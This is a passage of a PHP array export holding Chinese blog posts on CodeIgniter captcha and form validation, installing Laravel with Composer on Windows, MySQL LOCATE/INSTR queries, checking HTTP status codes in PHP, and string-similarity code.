&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&#39;font_path&#39;&nbsp;=&gt;&nbsp;&#39;./path/to/fonts/texb.ttf&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//如果验证码为中文，指定字体目录
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&#39;img_width&#39;&nbsp;=&gt;&nbsp;&#39;150&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&#39;img_height&#39;&nbsp;=&gt;&nbsp;30,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&#39;expiration&#39;&nbsp;=&gt;&nbsp;60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//验证码删除时间,秒
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cap&nbsp;=&nbsp;create_captcha($vals);&nbsp;//创建验证码
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//echo&nbsp;$cap[&#39;image&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;view(&#39;user/code&#39;,array(&#39;cap&#39;=&gt;$cap[&#39;image&#39;]));&nbsp;//将图片分配到页面
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//echo&nbsp;$cap[&#39;word&#39;];&nbsp;//验证码数字内容，可以放到session中，进行验证，看手册
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//session_start();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$_SESSION[&#39;cap&#39;]&nbsp;=&nbsp;$cap[&#39;word&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//验证的时候，对比$cap[&#39;word&#39;]就行
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
CI中的表单验证
&nbsp;&nbsp;&nbsp;&nbsp;//表单验证类,此方法可以不要，直接用下面的,没有数据直接显示，所有类似的都可以
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;forms()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;view(&#39;user/add&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//表单验证类
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;form()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;library(&#39;form_validation&#39;);&nbsp;&nbsp;&nbsp;&nbsp;//加载类库
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//验证规则
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;form_validation-&gt;set_rules(&#39;name&#39;,&nbsp;&#39;用户名&#39;,&nbsp;&#39;required&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bool&nbsp;=&nbsp;$this-&gt;form_validation-&gt;run();&nbsp;//执行验证，成功返回true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//var_dump($bool);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($bool)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//为真，调用模型保存到数据库
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//显示错误信息
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;view(&#39;user/form&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;html&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;&lt;/title&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;body&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;echo&nbsp;validation_errors();?&gt;&nbsp;&lt;!--&nbsp;显示所有错误&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;action=&quot;&lt;?php&nbsp;echo&nbsp;site_url(&#39;user/insert&#39;);&nbsp;?&gt;&quot;&nbsp;method=&quot;post&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name:&lt;input&nbsp;type=&quot;text&quot;&nbsp;name=&quot;name&quot;&nbsp;value=&quot;&lt;?php&nbsp;echo&nbsp;set_value(&#39;name&#39;);&nbsp;?&gt;&quot;/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;?php&nbsp;echo&nbsp;form_error(&#39;name&#39;,&#39;&lt;span&gt;&#39;,&#39;&lt;/span&gt;&#39;);?&gt;&lt;!--&nbsp;输出错误信息&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;br&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass:&lt;input&nbsp;type=&quot;text&quot;&nbsp;name=&quot;password&quot;&nbsp;/&gt;&lt;br&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;email:&lt;input&nbsp;type=&quot;text&quot;&nbsp;name=&quot;email&quot;&nbsp;/&gt;&lt;br&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;submit&quot;&nbsp;value=&quot;提交&quot;&nbsp;/&gt;&lt;br&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/body&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/html&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
修改语言包
&nbsp;&nbsp;&nbsp;&nbsp;//语言包放到application/language/
&nbsp;&nbsp;&nbsp;&nbsp;//修改配置文件$config[&#39;language&#39;]&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&#39;english&#39;;</pre><p><br/></p>',
            'keyword' => 'CI,框架',
            'sortid' => '1',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:25:08',
          ),
          44 => 
          array (
            'id' => '41',
            'uid' => '1',
            'title' => 'windows 上安装配置Laravel',
            'content' => '<p>前言：最近利用闲暇时间打算学习一下Laravel，Laravel的安装方法和ThinkPHP等的安装方式是不一样的，Laravel 框架使用 <a title=\\"\\" href=\\"http://getcomposer.org/\\" target=\\"_blank\\" data-original-title=\\"Composer\\">Composer</a> 来　　　管理其依赖性，安装之前也在网上找了一些文章，所以将我觉得有用的整理一下。</p><h3>1、本地环境配置</h3><p>首先要想安装Laravel 框架则首先需要配置开发环境版本，你也可以选择安装wamp等集成环境；由于Laravel框架对于版本上有一些要求，所以应该下载一个较高的版本，基本要求如下：</p><ul><li><p>PHP 版本 &gt;= 5.4</p></li><li><p>Mcrypt PHP 扩展</p></li><li><p>OpenSSL PHP 扩展</p></li><li><p>Mbstring PHP 扩展</p></li><li><p>Tokenizer PHP 扩展</p></li><li><p>php.ini中开启php_openssl，php_fileinfo扩展</p></li></ul><h3>2、安装Composer</h3><p>首先你需要安装Composer，Composer是PHP依赖管理工具，Laravel框架就是使用 Composer 执行安装和依赖管理。</p><p>下载地址：https://getcomposer.org/Composer-Setup.exe 这是windows上的安装包，一路next即可安装。</p><p>同时也可以通过windows命令行工具进行安装：<code class=\\" language-bash\\">php -r &quot;readfile(&#39;https://getcomposer.org/installer&#39;);&quot; php</code></p><p><span style=\\"background-color: #ffffff; color: #000000;\\">下载完成之后直接双击安装–“<strong>Next</strong>”–选上“<strong>Install Shell Menus</strong>”–“<strong>Next</strong>”，这一步需要选择<strong>php.exe</strong>的路径，由于我的PHP安装在<strong>D:\\\\php</strong>，所以选择路径“<strong>D:\\\\php\\\\php.exe</strong>”，之后继续“<strong>Next</strong>”，这时会下载一个<strong>composer.phar</strong>的文件（可能会比较慢，建议安装前FQ~），之后经过一段时间等待，Composer就安装完成了。<br/></span></p><p><span style=\\"background-color: #ffffff; color: #000000;\\">composer安装完成后 在cmd下输入composer 显示以下证明安装成功</span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=\\"/public/upload/image/20150921/1442815192182885.jpg\\" title=\\"1442815192182885.jpg\\" alt=\\"111101131470354590.gif.jpg\\"/></p><h3>3、安装Laravel</h3><p>一、打开cmd，使用命令转跳到www目录，输入以下命令</p><p><span style=\\"font-size: 18px;\\">　　</span><span class=\\"pln\\">composer create<span class=\\"pun\\">-<span class=\\"pln\\">project laravel<span class=\\"pun\\">/<span class=\\"pln\\">laravel Mylaravel</span></span></span></span></span></p><p><span style=\\"font-size: 18px;\\"><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\">　　</span></span></span></span></span></span><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\">最后一个是安装生成目录的名称，可以修改，而其他的不能修改。</span></span></span></span></span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=\\"/public/upload/image/20150921/1442815215122068.jpg\\" title=\\"1442815215122068.jpg\\" alt=\\"222101143029572459.jpg\\"/><br/></p><p><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\">二、下载Laravel，地址：http://www.golaravel.com/download/</span></span></span></span></span></p><p><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\">将下载的laravel解压到本地项目目录下 ，我的是D:/www/MyLaravel</span></span></span></span></span></p><p><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\">cmd 下进入到项目目录，然后运行命令：composer install 会自动安装</span></span></span></span></span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=\\"/public/upload/image/20150921/1442815244169588.jpg\\" title=\\"1442815244169588.jpg\\" alt=\\"333101139140355629.jpg\\"/></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=\\"/public/upload/image/20150921/1442815264450757.jpg\\" title=\\"1442815264450757.jpg\\" alt=\\"444101141435519416.jpg\\"/><br/></p><p><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\"><span class=\\"pun\\"><span class=\\"pln\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装完成后，访问 <code>http://localhost/laravel5/public，查看是否安装OK。</code></span></span></span></span></span></p><p><br/></p><p><br/></p><p></p>',
            'keyword' => 'windows,Laravel',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:22:09',
          ),
          45 => 
          array (
            'id' => '40',
            'uid' => '1',
            'title' => 'MySql查询语句，比like语句更高效的写法locate(position)和instr',
            'content' => '<p><span style=\\"color: #000000;\\"><strong>当数据量比较大时，但是还达不到使用其他检索等，使用MySQL的LIKE语句其实是可以使用其他函数代替的，并且速度也要快上一些。</strong><br/><br/>LIKE语句:<br/>SELECT * FROM `table` where title like &#39;%keyword%&#39;;</span><br/><br/><span style=\\"color: #000000;\\">其实可以使用 locate(position) 和 instr
这两个函数来代替</span><br/><br/><span style=\\"color: #000000;\\">LOCATE语句:</span></p><p><span style=\\"color: #000000;\\">SELECT * FROM `table` where LOCATE(&#39;keyword&#39;,title);</span><br/><br/><span style=\\"color: #000000;\\">POSITION语句:</span></p><p><span style=\\"color: #000000;\\">SELECT * FROM `table` where position(&#39;keyword&#39; IN title);</span><br/><br/><span style=\\"color: #000000;\\">INSTR语句:</span></p><p><span style=\\"color: #000000;\\">SELECT * FROM `table` where INSTR(title,&#39;keyword)</span></p><p><br/></p>',
            'keyword' => 'mysql,like,locate,position,instr',
            'sortid' => '4',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:07:19',
          ),
          46 => 
          array (
            'id' => '39',
            'uid' => '1',
            'title' => 'php获取http状态码程序代码',
            'content' => '<p>经常需要判断文件是否可以访问，可以通过http状态码判别，200为正常访问，404为找不到该页面，代码如下:</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
//&nbsp;设置url
$url&nbsp;=&nbsp;&#39;http://www.111cn.net&#39;;
function&nbsp;get_http_status_code($url)&nbsp;{
&nbsp;if(empty($url))&nbsp;return&nbsp;false;
&nbsp;$url&nbsp;=&nbsp;parse_url($url);
&nbsp;$host&nbsp;=&nbsp;isset($url[&#39;host&#39;])&nbsp;?&nbsp;$url[&#39;host&#39;]&nbsp;:&nbsp;&#39;&#39;;
&nbsp;$port&nbsp;=&nbsp;isset($url[&#39;port&#39;])&nbsp;?&nbsp;$url[&#39;port&#39;]&nbsp;:&nbsp;&#39;80&#39;;
&nbsp;$path&nbsp;=&nbsp;isset($url[&#39;path&#39;])&nbsp;?&nbsp;$url[&#39;path&#39;]&nbsp;:&nbsp;&#39;&#39;;
&nbsp;$query&nbsp;=&nbsp;isset($url[&#39;query&#39;])&nbsp;?&nbsp;$url[&#39;query&#39;]&nbsp;:&nbsp;&#39;&#39;;


&nbsp;$request&nbsp;=&nbsp;&quot;HEAD&nbsp;$path?$query&nbsp;HTTP/1.1rn&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.&quot;Host:&nbsp;$hostrn&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.&quot;Connection:&nbsp;closern&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.&quot;rn&quot;;

&nbsp;$address&nbsp;=&nbsp;gethostbyname($host);
&nbsp;$socket&nbsp;=&nbsp;socket_create(AF_INET,&nbsp;SOCK_STREAM,&nbsp;SOL_TCP);
&nbsp;socket_connect($socket,&nbsp;$address,&nbsp;$port);

&nbsp;socket_write($socket,&nbsp;$request,&nbsp;strlen($request));

&nbsp;$response&nbsp;=&nbsp;split(&#39;&nbsp;&#39;,&nbsp;socket_read($socket,&nbsp;1024));
&nbsp;socket_close($socket);
&nbsp;return&nbsp;&nbsp;trim($response[1]);
}
echo&nbsp;get_http_status_code($url);</pre><p></p><p><strong><br/></strong></p><p><strong>另一种获取http状态码的办法</strong></p><p>使用curl需要在php.ini中设置启用才行 &gt;&lt; Windows的服务器中，打开php.ini，找到：<br/>extension=php_curl.dll<br/>去掉前面的注释既可 。</p><pre class=\\"brush:php;toolbar:false\\">$curl&nbsp;=&nbsp;curl_init();
$url=’http://www.111cn.net’;
curl_setopt($curl,&nbsp;CURLOPT_URL,&nbsp;$url);&nbsp;//设置URL
curl_setopt($curl,&nbsp;CURLOPT_HEADER,&nbsp;1);&nbsp;//获取Header
curl_setopt($curl,CURLOPT_NOBODY,true);&nbsp;//Body就不要了吧，我们只是需要Head
curl_setopt($curl,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);&nbsp;//数据存到成字符串吧，别给我直接输出到屏幕了
$data&nbsp;=&nbsp;curl_exec($curl);&nbsp;//开始执行啦～
echo&nbsp;curl_getinfo($curl,CURLINFO_HTTP_CODE);&nbsp;//我知道HTTPSTAT码哦～
curl_close($curl);&nbsp;//用完记得关掉他</pre><p><br/></p><p>一些状态代码</p><p>1xx：请求收到，继续处理&nbsp; <br/>2xx：操作成功收到，分析、接受&nbsp; <br/>3xx：完成此请求必须进一步处理&nbsp; <br/>4xx：请求包含一个错误语法或不能完成&nbsp; <br/>5xx：服务器执行一个完全有效请求失败&nbsp;</p><p>100——客户必须继续发出请求&nbsp; <br/>101——客户要求服务器根据请求转换HTTP协议版本&nbsp;</p><p>200——交易成功&nbsp; <br/>201——提示知道新文件的URL&nbsp; <br/>202——接受和处理、但处理未完成&nbsp; <br/>203——返回信息不确定或不完整&nbsp; <br/>204——请求收到，但返回信息为空&nbsp; <br/>205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件&nbsp; <br/>206——服务器已经完成了部分用户的GET请求&nbsp;</p><p>300——请求的资源可在多处得到&nbsp; <br/>301——删除请求数据&nbsp; <br/>302——在其他地址发现了请求数据&nbsp; <br/>303——建议客户访问其他URL或访问方式&nbsp; <br/>304——客户端已经执行了GET，但文件未变化&nbsp; <br/>305——请求的资源必须从服务器指定的地址得到&nbsp; <br/>306——前一版本HTTP中使用的代码，现行版本中不再使用&nbsp; <br/>307——申明请求的资源临时性删除&nbsp;</p><p>400——错误请求，如语法错误&nbsp; <br/>401——请求授权失败&nbsp; <br/>402——保留有效ChargeTo头响应&nbsp; <br/>403——请求不允许&nbsp; <br/>404——没有发现文件、查询或URl&nbsp; <br/>405——用户在Request-Line字段定义的方法不允许&nbsp; <br/>406——根据用户发送的Accept拖，请求资源不可访问&nbsp; <br/>407——类似401，用户必须首先在代理服务器上得到授权&nbsp; <br/>408——客户端没有在用户指定的饿时间内完成请求&nbsp; <br/>409——对当前资源状态，请求不能完成&nbsp; <br/>410——服务器上不再有此资源且无进一步的参考地址&nbsp; <br/>411——服务器拒绝用户定义的Content-Length属性请求&nbsp; <br/>412——一个或多个请求头字段在当前请求中错误&nbsp; <br/>413——请求的资源大于服务器允许的大小&nbsp; <br/>414——请求的资源URL长于服务器允许的长度&nbsp; <br/>415——请求资源不支持请求项目格式&nbsp; <br/>416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求&nbsp; <br/>也不包含If-Range请求头字段&nbsp; <br/>417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求&nbsp;</p><p>500——服务器产生内部错误&nbsp; <br/>501——服务器不支持请求的函数&nbsp; <br/>502——服务器暂时不可用，有时是为了防止发生系统过载&nbsp; <br/>503——服务器过载或暂停维修&nbsp; <br/>504——关口过载，服务器使用另一个关口或服务来响应用户，等待时间设定值较长&nbsp; <br/>505——服务器不支持或拒绝支请求头中指定的HTTP版本</p><p><br/></p><p><br/></p>',
            'keyword' => 'php,http,404,状态',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:05:23',
          ),
          47 => 
          array (
            'id' => '38',
            'uid' => '1',
            'title' => 'php 字符串相似度计算similar_text()函数',
            'content' => '<p>有时我们希望查找到相关文章，PHP有一个内置函数similar_text()：<br/></p><h2>定义和用法</h2><h2>similar_text() 函数计算两个字符串的匹配字符的数目。</h2><p>该函数也可以计算两个字符串的相似度（以百分比计）。</p><p>语法：similar_text(string1,string2,percent)</p><p>string1&nbsp; 必需。规定要比较的第一个字符串。</p><p>string2&nbsp; 必需。规定要比较的第二个字符串。</p><p>percent 可选。规定供存储百分比相似度的变量名。</p><p>php默认有个函数similar_text()用于计算字符串之间的相似度，该函数也可以计算两个字符串的相似度（以百分比计）。不过这个函数感觉对中文计算很不准确比如：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
similar_text(&quot;Hello&nbsp;World&quot;,&quot;Hello&nbsp;Peter&quot;,$percent);
echo&nbsp;$percent;
?&gt;</pre><p>下面有一个是在网上看到他人写的一个，代码如下：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
class&nbsp;LCS&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;$str1;
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;$str2;
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;$c&nbsp;=&nbsp;array();
&nbsp;&nbsp;&nbsp;&nbsp;/*返回串一和串二的最长公共子序列
*/
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;getLCS($str1,&nbsp;$str2,&nbsp;$len1&nbsp;=&nbsp;0,&nbsp;$len2&nbsp;=&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;str1&nbsp;=&nbsp;$str1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;str2&nbsp;=&nbsp;$str2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($len1&nbsp;==&nbsp;0)&nbsp;$len1&nbsp;=&nbsp;strlen($str1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($len2&nbsp;==&nbsp;0)&nbsp;$len2&nbsp;=&nbsp;strlen($str2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;initC($len1,&nbsp;$len2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;printLCS($this-&gt;c,&nbsp;$len1&nbsp;-&nbsp;1,&nbsp;$len2&nbsp;-&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;/*返回两个串的相似度
*/
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;getSimilar($str1,&nbsp;$str2)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$len1&nbsp;=&nbsp;strlen($str1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$len2&nbsp;=&nbsp;strlen($str2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$len&nbsp;=&nbsp;strlen($this-&gt;getLCS($str1,&nbsp;$str2,&nbsp;$len1,&nbsp;$len2));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$len&nbsp;*&nbsp;2&nbsp;/&nbsp;($len1&nbsp;+&nbsp;$len2);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;initC($len1,&nbsp;$len2)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;($i&nbsp;=&nbsp;0;&nbsp;$i&nbsp;&lt;&nbsp;$len1;&nbsp;$i++)&nbsp;$this-&gt;c[$i][0]&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;($j&nbsp;=&nbsp;0;&nbsp;$j&nbsp;&lt;&nbsp;$len2;&nbsp;$j++)&nbsp;$this-&gt;c[0][$j]&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;($i&nbsp;=&nbsp;1;&nbsp;$i&nbsp;&lt;&nbsp;$len1;&nbsp;$i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;($j&nbsp;=&nbsp;1;&nbsp;$j&nbsp;&lt;&nbsp;$len2;&nbsp;$j++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($this-&gt;str1[$i]&nbsp;==&nbsp;$this-&gt;str2[$j])&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;c[$i][$j]&nbsp;=&nbsp;$this-&gt;c[$i&nbsp;-&nbsp;1][$j&nbsp;-&nbsp;1]&nbsp;+&nbsp;1;
